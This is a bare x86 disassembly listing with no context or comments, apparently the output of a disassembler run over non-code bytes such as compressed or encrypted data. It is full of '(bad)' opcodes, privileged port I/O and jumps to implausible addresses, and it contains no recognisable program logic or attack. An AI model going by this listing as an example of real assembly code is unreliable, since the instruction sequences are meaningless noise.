  41dbb8:	ror    BYTE PTR ds:[ecx+0x4a4f46a8],0xcc
  41dbc0:	hlt    
  41dbc1:	je     0x41dbe4
  41dbc3:	add    bh,bh
  41dbc5:	jg     0x41dc1d
  41dbc7:	fdivr  DWORD PTR [edi-0x3a04b9a2]
  41dbcd:	pop    eax
  41dbce:	mov    edi,0xf06e3fe8
  41dbd3:	sti    
  41dbd4:	jnp    0x41db8d
  41dbd6:	neg    BYTE PTR [ecx-0x20]
  41dbd9:	jbe    0x41dbd3
  41dbdb:	(bad)  
  41dbdc:	cld    
  41dbdd:	add    BYTE PTR [edi+ecx*4],0xef
  41dbe1:	mov    cl,BYTE PTR [ebx+edx*8]
  41dbe4:	sub    al,0xb6
  41dbe6:	or     al,BYTE PTR [ebx+0x3a]
  41dbe9:	xchg   edx,eax
  41dbea:	(bad)  
  41dbeb:	mov    edi,0x543a6891
  41dbf0:	and    BYTE PTR [edi-0x41],bh
  41dbf3:	sub    al,0x7f
  41dbf5:	add    al,bh
  41dbf7:	push   0xbabf34a0
  41dbfc:	aas    
  41dbfd:	ret    0xff44
  41dc00:	leave  
  41dc01:	ja     0x41dbaf
  41dc03:	ss dec esp
  41dc05:	mov    edi,0xbf58d67f
  41dc0a:	fiadd  WORD PTR [esi+0x69]
  41dc0d:	cmp    edx,DWORD PTR [eax]
  41dc0f:	adc    eax,0xf8523efe
  41dc14:	cdq    
  41dc15:	mov    dh,0xd6
  41dc17:	in     eax,0xdb
  41dc19:	and    ecx,DWORD PTR [eax]
  41dc1b:	dec    esp
  41dc1c:	pushf  
  41dc1d:	add    BYTE PTR [ebx+0x4a5576e6],cl
  41dc23:	(bad)  
  41dc24:	ins    DWORD PTR es:[edi],dx
  41dc25:	aaa    
  41dc26:	xchg   esi,eax
  41dc27:	ss pusha 
  41dc29:	in     al,0x2f
  41dc2b:	out    0x96,eax
  41dc2d:	sbb    eax,0xda09b915
  41dc32:	(bad)  
  41dc33:	lea    esi,[esi-0x18b8e4aa]
  41dc39:	xchg   ebp,eax
  41dc3a:	xlat   BYTE PTR ds:[ebx]
  41dc3b:	outs   dx,DWORD PTR ds:[esi]
  41dc3c:	mov    esi,0x4a1a95e3
  41dc41:	xchg   edi,eax
  41dc42:	sub    esp,ecx
  41dc44:	xor    bl,BYTE PTR [edx]
  41dc46:	test   DWORD PTR [ebx-0x41],0xb6c2c6e1
  41dc4d:	cmp    eax,DWORD PTR [eax+0x578893ec]
  41dc53:	ror    BYTE PTR [ecx+0x1b6dc1b5],cl
  41dc59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc5a:	ins    DWORD PTR es:[edi],dx
  41dc5b:	mov    DWORD PTR ds:0x1ba2b09b,ebx
  41dc61:	out    0xb5,al
  41dc63:	outs   dx,BYTE PTR ds:[esi]
  41dc64:	sub    al,0x6d
  41dc66:	ins    BYTE PTR es:[edi],dx
  41dc67:	mov    ds:0x14391519,eax
  41dc6c:	lods   eax,DWORD PTR ds:[esi]
  41dc6d:	(bad)  
  41dc6e:	jmp    0x5892367d
  41dc73:	fcomp  DWORD PTR [edx]
  41dc75:	sbb    DWORD PTR [edi],ebx
  41dc77:	(bad)  [edx-0x569224fc]
  41dc7d:	fnstsw WORD PTR [ecx-0x15b91cf]
  41dc83:	add    BYTE PTR [edx-0x224cb1f8],dl
  41dc89:	mov    ebx,0xcd13e914
  41dc8e:	jae    0x41dc8c
  41dc90:	add    eax,0x2c9910aa
  41dc95:	shl    BYTE PTR [esi+0x719d6d6d],cl
  41dc9b:	ret    0x3baf
  41dc9e:	cs xchg edx,eax
  41dca0:	mov    edx,ebx
  41dca2:	sub    ch,al
  41dca4:	mov    dh,0xc1
  41dca6:	cmc    
  41dca7:	pop    ss
  41dca8:	adc    eax,ebp
  41dcaa:	mov    bl,0x4c
  41dcac:	push   0xb7db6db7
  41dcb1:	jno    0x41dcc7
  41dcb3:	dec    ebx
  41dcb4:	cmp    edi,DWORD PTR [ebx]
  41dcb6:	sub    DWORD PTR [edi-0x727a705b],esp
  41dcbc:	ficomp DWORD PTR [eax+0x4]
  41dcbf:	xor    eax,0xde6030bd
  41dcc4:	sub    dh,dl
  41dcc6:	ss stos BYTE PTR es:[edi],al
  41dcc8:	push   ecx
  41dcc9:	sub    bh,cl
  41dccb:	jp     0x41dd41
  41dccd:	or     esi,DWORD PTR [esi-0x7c247f93]
  41dcd3:	imul   edx,DWORD PTR [ebx],0x5a
  41dcd6:	and    al,BYTE PTR [esi+0x7d2ce3c2]
  41dcdc:	ins    DWORD PTR es:[edi],dx
  41dcdd:	popa   
  41dcde:	stc    
  41dcdf:	ret    0x9a21
  41dce2:	sbb    al,0x0
  41dce4:	ins    DWORD PTR es:[edi],dx
  41dce5:	xor    DWORD PTR ss:[ebp+0x62d8dd20],eax
  41dcec:	and    DWORD PTR [edi-0x395a13dc],0xb5ab18b0
  41dcf6:	jne    0x41dc99
  41dcf8:	(bad)  [esi+0x134170c4]
  41dcfe:	(bad)  
  41dcff:	sub    ebx,DWORD PTR [ebx+eiz*2]
  41dd02:	add    DWORD PTR [esi*2+0x7773c1a1],ecx
  41dd09:	ins    BYTE PTR es:[edi],dx
  41dd0a:	and    cl,BYTE PTR fs:[edx-0x25]
  41dd0e:	ins    DWORD PTR es:[edi],dx
  41dd0f:	arpl   WORD PTR [edi+esi*4-0x2c],dx
  41dd13:	fwait
  41dd14:	loope  0x41dd8f
  41dd16:	inc    esp
  41dd17:	(bad)  
  41dd18:	outs   dx,BYTE PTR ds:[esi]
  41dd19:	scas   eax,DWORD PTR es:[edi]
  41dd1a:	sbb    bl,al
  41dd1c:	push   ss
  41dd1d:	xchg   esp,eax
  41dd1e:	mov    esi,0xf31726
  41dd23:	bound  esi,QWORD PTR [esi+0x31b62d8d]
  41dd29:	mov    WORD PTR [eax+esi*8],fs
  41dd2c:	inc    ebx
  41dd2d:	mov    ebp,0x6b565ff4
  41dd32:	sub    al,0x6c
  41dd34:	mov    bh,0x25
  41dd36:	enter  0x2bb,0xa1
  41dd3a:	aaa    
  41dd3b:	cs iret 
  41dd3d:	lds    esi,FWORD PTR [edi+0x1970b5b2]
  41dd43:	mov    bl,0xa6
  41dd45:	mov    esi,0x4b02f6f4
  41dd4a:	mov    dh,0xda
  41dd4c:	mov    dh,0x6d
  41dd4e:	or     edi,ebp
  41dd50:	out    0xda,al
  41dd52:	push   ebp
  41dd53:	(bad)  
  41dd54:	in     al,dx
  41dd55:	fnsave [ecx+ebp*1-0x7d]
  41dd59:	mov    dh,0x6d
  41dd5b:	xchg   edi,eax
  41dd5c:	pop    esp
  41dd5d:	inc    esp
  41dd5e:	adc    eax,0x8bf2c071
  41dd63:	stos   BYTE PTR es:[edi],al
  41dd64:	retf   
  41dd65:	test   DWORD PTR [ebp-0x7dba8a4a],eax
  41dd6b:	sbb    DWORD PTR [edx+edx*4],edx
  41dd6e:	call   0x85f9:0x46db0470
  41dd75:	pop    ebx
  41dd76:	xchg   ecx,eax
  41dd77:	xchg   edx,eax
  41dd78:	mov    es,WORD PTR [eax]
  41dd7a:	jp     0x41dd86
  41dd7c:	or     al,0xd1
  41dd7e:	pop    ecx
  41dd7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd80:	fld    TBYTE PTR [esi]
  41dd82:	sub    al,0xb5
  41dd84:	push   ecx
  41dd85:	adc    BYTE PTR [edx+ecx*1],0x40
  41dd89:	es xor al,0x65
  41dd8c:	rcr    BYTE PTR [ecx+0x2d],cl
  41dd8f:	(bad)  [edx]
  41dd91:	push   ecx
  41dd92:	in     eax,dx
  41dd93:	out    dx,al
  41dd94:	(bad)  
  41dd95:	fimul  DWORD PTR [eax]
  41dd97:	sub    DWORD PTR [esi-0x61527684],esi
  41dd9d:	cmc    
  41dd9e:	xchg   edx,eax
  41dd9f:	xchg   edi,eax
  41dda0:	mov    ah,0xf8
  41dda2:	add    BYTE PTR [esi-0x4939e802],ah
  41dda8:	rol    dh,1
  41ddaa:	(bad)  
  41ddab:	cld    
  41ddac:	nop
  41ddad:	push   ebx
  41ddae:	mov    WORD PTR [ebx+0x6ed67572],?
  41ddb4:	in     eax,dx
  41ddb5:	(bad)  
  41ddb6:	push   eax
  41ddb7:	sbb    BYTE PTR [edx+0x76],0xcb
  41ddbb:	jmp    0x47ad6dca
  41ddc0:	jae    0x41dd76
  41ddc2:	in     eax,dx
  41ddc3:	ret    0x37cc
  41ddc6:	loop   0x41de42
  41ddc8:	sub    al,0x48
  41ddca:	mov    ecx,0xb7280b69
  41ddcf:	ins    DWORD PTR es:[edi],dx
  41ddd0:	popa   
  41ddd1:	pop    edx
  41ddd2:	adc    BYTE PTR [eax+0x8],ah
  41ddd5:	sub    al,0xc8
  41ddd7:	mov    ecx,DWORD PTR [ecx+esi*2-0x5f]
  41dddb:	pop    ebp
  41dddc:	fsubr  DWORD PTR [edx]
  41ddde:	and    eax,0x98d55f0d
  41dde3:	addr16 inc edx
  41dde5:	mov    edx,0xfb5b1bb5
  41ddea:	adc    ah,BYTE PTR [eax+0x341d980c]
  41ddf0:	lahf   
  41ddf1:	push   cs
  41ddf2:	push   edx
  41ddf3:	sub    DWORD PTR [ebp+ecx*4-0x13],0xffffffb6
  41ddf8:	and    BYTE PTR [ebx-0x52468914],0xe9
  41ddff:	pop    ebp
  41de00:	sub    al,0xd3
  41de02:	(bad)  
  41de03:	outs   dx,BYTE PTR ds:[esi]
  41de04:	mov    cl,0x6d
  41de06:	vmread DWORD PTR [eax],esp
  41de09:	mov    es,esi
  41de0b:	ins    BYTE PTR es:[edi],dx
  41de0c:	push   es
  41de0d:	push   cs
  41de0e:	mov    dh,0xca
  41de10:	mov    bh,0xed
  41de12:	mov    dh,0xa5
  41de15:	or     al,0xf4
  41de17:	jecxz  0x41dddd
  41de19:	cmp    BYTE PTR [edx],ah
  41de1b:	add    BYTE PTR [esp+ecx*4-0x7b],cl
  41de1f:	mov    dh,0xb6
  41de21:	fstp   QWORD PTR [ecx-0x44]
  41de24:	mov    esp,0xaa5cc57a
  41de29:	jae    0x41de90
  41de2b:	retf   0x817f
  41de2e:	lea    esp,[edi-0x67]
  41de31:	dec    edx
  41de32:	add    BYTE PTR [edx],bl
  41de34:	cdq    
  41de35:	add    BYTE PTR [esi],ah
  41de37:	add    BYTE PTR cs:[esi],dh
  41de3a:	push   esp
  41de3b:	fcmovnu st,st(2)
  41de3d:	push   ss
  41de3e:	push   ss
  41de3f:	push   0x5e
  41de41:	jl     0x41de0b
  41de43:	and    BYTE PTR [edi-0x72e2195a],bl
  41de49:	mov    dh,0x71
  41de4b:	arpl   WORD PTR [esi+0x5a25885d],si
  41de51:	je     0x41deac
  41de53:	lea    edi,[edx-0x56]
  41de56:	adc    eax,0x99e23fd1
  41de5b:	adc    eax,0xad1b1bf9
  41de60:	push   ecx
  41de61:	add    dl,BYTE PTR [ebp+0x24b20323]
  41de67:	sub    cl,0xb2
  41de6a:	ins    DWORD PTR es:[edi],dx
  41de6b:	dec    ebx
  41de6c:	xor    bl,BYTE PTR [esi-0x33e2ac26]
  41de72:	(bad)  
  41de73:	xchg   edx,eax
  41de74:	sub    DWORD PTR [ebx-0x48],edi
  41de77:	mov    ch,0x5b
  41de79:	add    bh,BYTE PTR [ebx-0x4a]
  41de7c:	or     esp,DWORD PTR [ecx-0x1768b37d]
  41de82:	and    BYTE PTR [esi-0x25925a3f],bh
  41de88:	xor    al,BYTE PTR [esi+0x5]
  41de8b:	cmp    al,BYTE PTR [esi+ebx*4+0x5c5c009d]
  41de92:	pop    ds
  41de93:	push   ss
  41de94:	outs   dx,BYTE PTR ds:[esi]
  41de95:	push   ecx
  41de96:	mov    al,BYTE PTR [edi]
  41de98:	cmp    ch,BYTE PTR [edi-0x7929266b]
  41de9e:	inc    ecx
  41de9f:	mov    al,0xb5
  41dea1:	cld    
  41dea2:	add    al,al
  41dea4:	in     al,dx
  41dea5:	add    dh,bh
  41dea7:	bound  ecx,QWORD PTR [edx+0x3a]
  41deaa:	mov    al,0xc2
  41deac:	(bad)  
  41dead:	(bad)  
  41deae:	ss mov bh,0x4e
  41deb1:	sub    eax,0x361e477d
  41deb6:	or     dl,BYTE PTR [esi]
  41deb8:	ins    DWORD PTR es:[edi],dx
  41deb9:	shr    DWORD PTR [esi-0x25],1
  41debc:	ret    
  41debd:	pop    ss
  41debe:	pop    esp
  41debf:	push   0x510e2076
  41dec4:	retf   
  41dec5:	ins    DWORD PTR es:[edi],dx
  41dec6:	in     eax,dx
  41dec7:	ret    0xaab6
  41deca:	jl     0x41de64
  41decc:	cwde   
  41decd:	mov    ebx,0x50dac8e7
  41ded2:	dec    eax
  41ded3:	push   0xffffffe9
  41ded5:	push   esi
  41ded6:	mov    eax,0x949aa3d7
  41dedb:	inc    ecx
  41dedc:	arpl   bp,si
  41dede:	retf   
  41dedf:	adc    bl,ch
  41dee1:	mov    dh,0xad
  41dee3:	jge    0x41de6f
  41dee5:	push   edi
  41dee6:	sbb    ch,al
  41dee8:	push   cs
  41dee9:	lods   al,BYTE PTR ds:[esi]
  41deea:	and    dh,dl
  41deec:	sbb    eax,0x2b6d9160
  41def1:	fsub   QWORD PTR [eax-0x4d302b64]
  41def7:	pop    ds
  41def8:	lds    edi,FWORD PTR [edi]
  41defa:	adc    al,0x63
  41defc:	popa   
  41defd:	(bad)  [esi-0x7e940fe]
  41df03:	add    al,0xa7
  41df05:	lock and ch,ah
  41df08:	add    ah,bl
  41df0a:	mov    dh,0x76
  41df0c:	popa   
  41df0d:	les    eax,FWORD PTR [edx+0xbbf5a4b]
  41df13:	in     eax,0x8f
  41df15:	std    
  41df16:	xchg   esp,eax
  41df17:	pop    ebp
  41df18:	push   0xffffffb7
  41df1a:	lods   eax,DWORD PTR ds:[esi]
  41df1b:	ds cmp dh,ch
  41df1e:	xor    BYTE PTR [ebp+0x5f],cl
  41df21:	ds jmp 0x41defa
  41df24:	rcl    dl,cl
  41df26:	test   DWORD PTR [ebp-0x6837e24d],ebp
  41df2c:	stos   BYTE PTR es:[edi],al
  41df2d:	push   ss
  41df2e:	and    ch,bh
  41df30:	ret    0xb6f
  41df33:	pop    ss
  41df34:	fisubr DWORD PTR [edx-0x41]
  41df37:	jl     0x41df15
  41df39:	fbstp  TBYTE PTR [ecx]
  41df3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df3c:	xor    eax,0x6d4e00b7
  41df41:	fcmovnbe st,st(6)
  41df43:	cs call 0x88f56262
  41df49:	push   esi
  41df4a:	mov    al,0xff
  41df4c:	mov    al,ds:0xb2cb1b6d
  41df51:	mov    edi,0xbd4e7464
  41df56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df57:	imul   esp,DWORD PTR [eax],0xfffffff9
  41df5a:	mov    bh,0x2e
  41df5c:	sub    al,0xce
  41df5e:	adc    ch,BYTE PTR [ebx]
  41df60:	jb     0x41def0
  41df62:	and    eax,0xd57c0006
  41df67:	add    BYTE PTR [eax+0x5b1b4bea],ch
  41df6d:	ins    DWORD PTR es:[edi],dx
  41df6e:	mov    BYTE PTR [edx+edi*8-0x10bb6025],cl
  41df75:	jle    0x41dfd2
  41df77:	mov    ebx,0x838ab42d
  41df7c:	sbb    edx,ebp
  41df7e:	and    BYTE PTR [esi-0x9],bl
  41df81:	xor    eax,0x5c2daac2
  41df86:	mov    esi,0xe6ec32b5
  41df8b:	pop    edx
  41df8c:	icebp  
  41df8d:	add    BYTE PTR [eax],dl
  41df8f:	jp     0x41df92
  41df91:	mov    fs,WORD PTR [edi-0x5e8b5248]
  41df97:	or     BYTE PTR [edx],ah
  41df99:	out    dx,al
  41df9a:	xor    ebx,DWORD PTR [eax-0x24443d14]
  41dfa0:	(bad)  
  41dfa1:	mov    dh,0x2e
  41dfa3:	sub    esi,DWORD PTR [edi+0x23298245]
  41dfa9:	mov    WORD PTR [ebp-0x47205ffb],gs
  41dfaf:	mov    al,0x6d
  41dfb1:	cmp    eax,DWORD PTR [edx]
  41dfb3:	fnstsw WORD PTR [ebx+0x1e19fae5]
  41dfb9:	xor    eax,0xb614fa00
  41dfbe:	jbe    0x41e01b
  41dfc0:	sub    bh,bl
  41dfc2:	into   
  41dfc3:	mov    esp,cs
  41dfc5:	push   0x9bf6179b
  41dfca:	popa   
  41dfcb:	fcmovnu st,st(0)
  41dfcd:	or     ebx,DWORD PTR [edx]
  41dfcf:	pop    ebp
  41dfd0:	or     BYTE PTR ds:0xa2624cd7,al
  41dfd6:	ins    DWORD PTR es:[edi],dx
  41dfd7:	mov    eax,ds:0x7deeb689
  41dfdc:	in     eax,0xd8
  41dfde:	mov    esi,0x8d3ea4f4
  41dfe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfe4:	(bad)  
  41dfe5:	ret    0xed9c
  41dfe8:	les    edi,FWORD PTR [esi+0x24]
  41dfeb:	jecxz  0x41dff3
  41dfed:	and    DWORD PTR [eax-0x28],ebx
  41dff0:	fisub  DWORD PTR [ebp-0x2f9391ba]
  41dff6:	jmp    0x3861aa72
  41dffb:	mov    ebx,0x1edb697c
  41e000:	or     ch,BYTE PTR [edi]
  41e002:	stos   BYTE PTR es:[edi],al
  41e003:	xchg   ebp,eax
  41e004:	add    esi,DWORD PTR [ecx+0x0]
  41e007:	mov    ecx,esp
  41e009:	mov    ds:0xc2cb2c3b,al
  41e00e:	inc    esi
  41e00f:	xor    DWORD PTR [edx+0xe86927f],0xb965b5b6
  41e019:	sbb    al,0xa8
  41e01b:	mov    eax,0x3f7de0d6
  41e020:	mov    dh,0xc2
  41e022:	rol    dh,cl
  41e024:	ret    0x1062
  41e027:	push   ds
  41e028:	aas    
  41e029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e02a:	cwde   
  41e02b:	outs   dx,DWORD PTR ds:[esi]
  41e02c:	mov    ebp,DWORD PTR [esi+0x5b]
  41e02f:	sbb    ebx,ebx
  41e031:	sti    
  41e032:	or     BYTE PTR [ebx+eax*1+0x36],0xee
  41e037:	clc    
  41e038:	and    BYTE PTR [ecx-0x4c],bl
  41e03b:	sbb    ebp,ebp
  41e03d:	(bad)  
  41e03e:	(bad)  
  41e03f:	xor    eax,0xec3fd87d
  41e044:	or     DWORD PTR [ecx-0x4b4977d3],0x9236b615
  41e04e:	gs aaa 
  41e050:	cmp    edx,DWORD PTR [ebx+0xb6bd250]
  41e056:	pop    ebx
  41e057:	(bad)  
  41e058:	in     eax,dx
  41e059:	jmp    0x41e053
  41e05b:	jge    0x41e065
  41e05d:	jne    0x41e014
  41e05f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e060:	and    edx,DWORD PTR cs:[esi+0x444b8de5]
  41e067:	xchg   esp,eax
  41e068:	mov    eax,0x1e00a2ff
  41e06d:	jb     0x41dff9
  41e06f:	push   0x965965db
  41e074:	mov    ds:0x1c3276a8,al
  41e079:	add    ch,BYTE PTR [ebx+0x2c]
  41e07c:	pop    esp
  41e07d:	fsub   DWORD PTR [eax+0x57]
  41e080:	sub    esi,ecx
  41e082:	scas   al,BYTE PTR es:[edi]
  41e083:	xchg   edi,eax
  41e084:	loope  0x41e076
  41e086:	inc    ecx
  41e087:	ins    DWORD PTR es:[edi],dx
  41e088:	retf   
  41e089:	jbe    0x41e0ec
  41e08b:	cmp    al,0x91
  41e08d:	outs   dx,BYTE PTR ds:[esi]
  41e08e:	cmp    al,0x7d
  41e090:	loope  0x41e057
  41e092:	mov    dh,0x93
  41e094:	fcomp  st(2)
  41e096:	test   DWORD PTR [ebp+0x5e0f17f5],ebp
  41e09c:	scas   al,BYTE PTR es:[edi]
  41e09d:	jmp    0xbaf:0xa554650b
  41e0a4:	pop    edi
  41e0a5:	mov    ch,0x52
  41e0a7:	into   
  41e0a8:	add    BYTE PTR [edi+edx*4+0x48f1de27],al
  41e0af:	lds    ebp,FWORD PTR [ebx+0x69]
  41e0b2:	(bad)  [esi-0x79f076a2]
  41e0b8:	cmp    ebx,DWORD PTR [ecx-0x43]
  41e0bb:	inc    ecx
  41e0bc:	jo     0x41e076
  41e0be:	sbb    ebx,DWORD PTR [ebx]
  41e0c0:	fld    TBYTE PTR [ebp-0x62]
  41e0c3:	sbb    dh,BYTE PTR [edx-0x33]
  41e0c6:	add    eax,0x3f2e33ef
  41e0cb:	and    bl,al
  41e0cd:	mov    dh,0xb2
  41e0cf:	sub    al,0x56
  41e0d1:	dec    esi
  41e0d2:	jmp    0xba685e53
  41e0d7:	aad    0x2a
  41e0d9:	sar    esp,1
  41e0db:	push   esi
  41e0dc:	xchg   ecx,eax
  41e0dd:	mov    al,ds:0xb4b2d47a
  41e0e2:	fstp   QWORD PTR [esi]
  41e0e4:	sub    DWORD PTR [ebx+ecx*1-0x4c],ecx
  41e0e8:	pop    ebp
  41e0e9:	push   esi
  41e0ea:	cdq    
  41e0eb:	pop    edi
  41e0ec:	ss sub al,0x6c
  41e0ef:	mov    bh,0x85
  41e0f1:	xchg   esp,eax
  41e0f2:	xor    al,0x6b
  41e0f4:	jmp    0x96b9:0x22582f19
  41e0fb:	ss mov dh,0xad
  41e0fe:	mov    esp,0x1eaba1af
  41e103:	das    
  41e104:	repnz mov eax,0xd8ddb6b7
  41e10a:	pop    esp
  41e10b:	mov    cl,bh
  41e10d:	cli    
  41e10e:	retf   0xd671
  41e111:	lods   eax,DWORD PTR ds:[esi]
  41e112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e113:	popf   
  41e114:	and    DWORD PTR [esi-0x67b04b93],esi
  41e11a:	ror    BYTE PTR [ebx-0x11],1
  41e11d:	int3   
  41e11e:	(bad)  
  41e11f:	and    bl,bh
  41e121:	mov    edi,0xcb942c2e
  41e126:	ds and al,0xc0
  41e129:	mov    ecx,0x3ac21ff0
  41e12e:	rol    BYTE PTR [esi-0x45],1
  41e131:	rcl    ah,1
  41e133:	sub    edx,DWORD PTR [esi+0x34]
  41e136:	mov    bl,0x3f
  41e138:	rcr    BYTE PTR [ebx-0x73],cl
  41e13b:	in     eax,dx
  41e13c:	mov    dh,0x6e
  41e13e:	xor    cl,al
  41e140:	cld    
  41e141:	pop    esi
  41e142:	ja     0x41e1aa
  41e144:	and    al,0xa0
  41e146:	fwait
  41e147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e148:	das    
  41e149:	cs mov ah,0x12
  41e14c:	(bad)  
  41e14e:	dec    edi
  41e14f:	and    BYTE PTR [eax],dh
  41e151:	aas    
  41e152:	add    bl,BYTE PTR [eax-0x26]
  41e155:	sbb    dl,BYTE PTR [edi-0x541fd48a]
  41e15b:	retf   
  41e15c:	nop
  41e15d:	cmp    esp,DWORD PTR [ebx-0x26]
  41e160:	pop    eax
  41e161:	fcomp  DWORD PTR [eax-0x6f]
  41e164:	mov    dh,0x0
  41e166:	adc    bl,ch
  41e168:	sbb    DWORD PTR [edi],edi
  41e16a:	cwde   
  41e16b:	ins    DWORD PTR es:[edi],dx
  41e16c:	imul   esp,DWORD PTR [eax+0x5b],0xffffffc2
  41e170:	jno    0x41e189
  41e172:	popa   
  41e173:	cmp    DWORD PTR [ebp+0x3b],edx
  41e176:	icebp  
  41e177:	and    bl,bl
  41e179:	outs   dx,BYTE PTR ds:[esi]
  41e17a:	lea    ebx,[ebx-0x36]
  41e17d:	push   cs
  41e17e:	cli    
  41e17f:	mov    cl,0xa4
  41e181:	sbb    dh,BYTE PTR [esi+0x58386dfe]
  41e187:	xor    BYTE PTR [ebp-0x28d38693],dh
  41e18d:	xlat   BYTE PTR ds:[ebx]
  41e18e:	jno    0x41e11e
  41e190:	push   edx
  41e191:	jmp    0x55d9236c
  41e196:	xor    ebx,esp
  41e198:	mov    dl,0x0
  41e19a:	jmp    0xb5b2fc1f
  41e19f:	(bad)  
  41e1a0:	in     eax,dx
  41e1a1:	push   esi
  41e1a2:	aaa    
  41e1a3:	stos   BYTE PTR es:[edi],al
  41e1a4:	fdiv   DWORD PTR [ecx+edi*1-0x5b]
  41e1a8:	loope  0x41e12d
  41e1aa:	mov    eax,0xbcbb5bb5
  41e1af:	cs xchg edi,eax
  41e1b1:	pop    edi
  41e1b2:	stos   BYTE PTR es:[edi],al
  41e1b3:	(bad)  
  41e1b4:	aaa    
  41e1b5:	enter  0x4ae6,0x17
  41e1b9:	ins    BYTE PTR es:[edi],dx
  41e1ba:	in     eax,dx
  41e1bb:	inc    esi
  41e1bc:	pop    ebx
  41e1bd:	scas   eax,DWORD PTR es:[edi]
  41e1be:	or     al,0x62
  41e1c0:	retw   
  41e1c2:	xchg   edx,eax
  41e1c3:	add    eax,0xb1bbc69e
  41e1c8:	mov    ah,0x2d
  41e1ca:	sub    BYTE PTR [edi+0x47],bh
  41e1cd:	or     DWORD PTR ds:0xebf5183d,esi
  41e1d3:	(bad)  
  41e1d4:	in     eax,dx
  41e1d5:	mov    dh,0x6d
  41e1d7:	pop    ebx
  41e1d8:	push   eax
  41e1d9:	adc    al,0xcb
  41e1db:	mul    esi
  41e1dd:	cmc    
  41e1de:	jecxz  0x41e1cd
  41e1e0:	or     edi,DWORD PTR [ebp+0x56]
  41e1e3:	fsubr  DWORD PTR [esi+0x6c]
  41e1e6:	adc    esi,ebp
  41e1e8:	mov    cl,0x8e
  41e1ea:	add    eax,0xef0a59b3
  41e1ef:	mov    eax,0xe8c5b6c0
  41e1f4:	cmp    al,0x41
  41e1f6:	or     ecx,DWORD PTR [eax]
  41e1f8:	imul   ebx,DWORD PTR [ebx],0x54b1b0ac
  41e1fe:	pop    edx
  41e1ff:	ins    DWORD PTR es:[edi],dx
  41e200:	sbb    edi,DWORD PTR [ebp-0x56]
  41e203:	adc    eax,0x2b749248
  41e208:	mov    edi,0xab0b01b1
  41e20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e20e:	adc    al,0x0
  41e210:	cmp    BYTE PTR [ecx],dl
  41e212:	pop    ss
  41e213:	shl    bl,1
  41e215:	ins    DWORD PTR es:[edi],dx
  41e216:	ins    DWORD PTR es:[edi],dx
  41e217:	sub    edx,DWORD PTR [ebx+ebp*1+0x68]
  41e21b:	xor    esi,DWORD PTR [edx]
  41e21d:	xor    DWORD PTR gs:[edx],eax
  41e220:	pop    ebx
  41e221:	mov    ebx,0x422741b1
  41e226:	les    ebp,FWORD PTR [edi]
  41e228:	cmc    
  41e229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e22a:	sub    eax,0x42d2c24b
  41e22f:	loope  0x41e232
  41e231:	inc    edx
  41e232:	mov    al,ds:0x1d4104be
  41e237:	lods   al,BYTE PTR ds:[esi]
  41e238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e239:	in     eax,0x85
  41e23b:	in     eax,dx
  41e23c:	and    ah,dh
  41e23e:	lds    ecx,FWORD PTR [ecx+0x10]
  41e241:	lods   eax,DWORD PTR ds:[esi]
  41e242:	add    BYTE PTR [edi+0x35],cl
  41e245:	pop    ss
  41e246:	sbb    ebx,DWORD PTR [ebx]
  41e248:	lea    ebp,[esi+0x45a36491]
  41e24e:	xchg   DWORD PTR [ebx+0x5bf2dcae],ecx
  41e254:	ins    BYTE PTR es:[edi],dx
  41e255:	sbb    ebx,eax
  41e257:	(bad)  [ebp+0x41]
  41e25a:	adc    ch,BYTE PTR [ebx-0x34]
  41e25d:	add    BYTE PTR [edx+eax*1-0x3e],dh
  41e261:	(bad)  
  41e262:	lea    esi,[esi-0x40cb17ef]
  41e268:	sub    BYTE PTR [ecx-0x45],dl
  41e26b:	dec    ecx
  41e26c:	mov    dh,0x95
  41e26e:	mov    dh,0xdb
  41e270:	pop    es
  41e271:	inc    edi
  41e272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e273:	stos   DWORD PTR es:[edi],eax
  41e274:	outs   dx,BYTE PTR ds:[esi]
  41e275:	scas   eax,DWORD PTR es:[edi]
  41e276:	inc    esp
  41e277:	dec    ebp
  41e278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e279:	sbb    bh,BYTE PTR [esi]
  41e27b:	std    
  41e27c:	call   0x3f48b647
  41e281:	arpl   WORD PTR [ebx+esi*4+0x771f659f],bp
  41e288:	mov    dh,0xb0
  41e28a:	mov    al,0x35
  41e28c:	cld    
  41e28d:	clc    
  41e28e:	iret   
  41e28f:	cmp    al,BYTE PTR [eax-0x4964daa2]
  41e295:	or     ebp,DWORD PTR [ebp-0x17]
  41e298:	aad    0x7d
  41e29a:	inc    edi
  41e29b:	push   esp
  41e29c:	jmp    0x5faba862
  41e2a1:	dec    ebx
  41e2a2:	mov    ebx,0x95d5b1b0
  41e2a7:	jo     0x41e2bc
  41e2a9:	(bad)  
  41e2ab:	pop    ds
  41e2ac:	idiv   BYTE PTR [esi-0x3d1249d7]
  41e2b2:	inc    edx
  41e2b3:	popa   
  41e2b4:	pop    ebx
  41e2b5:	add    DWORD PTR [eax+0x1],edx
  41e2b8:	mov    esp,0xb6f2416f
  41e2bd:	mov    al,0x45
  41e2bf:	fld    TBYTE PTR [edx-0x3227d382]
  41e2c5:	or     eax,0x7941b3bd
  41e2ca:	popa   
  41e2cb:	loope  0x41e2ed
  41e2cd:	imul   bl
  41e2cf:	mov    eax,0xf003891
  41e2d4:	or     ebx,DWORD PTR [ebx+0x1b]
  41e2d7:	or     ebp,DWORD PTR [edx+edi*1-0x11a48dcd]
  41e2de:	fld    DWORD PTR [ebx+0x2c]
  41e2e1:	ins    BYTE PTR es:[edi],dx
  41e2e2:	sbb    ecx,DWORD PTR [ebx+0x77]
  41e2e5:	(bad)  
  41e2e6:	repz xchg edi,eax
  41e2e8:	inc    ecx
  41e2e9:	add    ebp,DWORD PTR [edx+0x64]
